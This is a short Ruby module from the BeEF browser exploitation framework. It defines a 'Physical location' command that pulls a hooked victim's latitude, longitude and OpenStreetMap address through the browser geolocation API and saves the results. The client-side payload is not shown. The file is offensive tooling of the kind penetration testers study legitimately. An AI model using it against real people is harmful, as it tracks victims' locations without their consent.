module BeEF
module Modules
module Commands


class Physical_location < BeEF::Command

  def initialize
    super({
      'Name' => 'Physical location',
      'Description' => %Q{
        This module will retrieve the physical location of the victim using the geolocation API
        },
      'Category' => 'Host',
      'Author' => ['antisnatchor'],
      'File' => __FILE__,
      'Target' => {
        'browser_name' =>     BeEF::Constants::Browsers::ALL
      }
    })

    use 'beef.geolocation'
    use_template!
  end

  def callback
    content = {}
    content['Geolocation Enabled'] = @datastore['geoLocEnabled']
    content['Latitude'] = @datastore['latitude']
    content['Longitude'] = @datastore['longitude']
    content['Open Street Map Address'] = @datastore['openStreetMap']
    save content
  end

end


end
end
end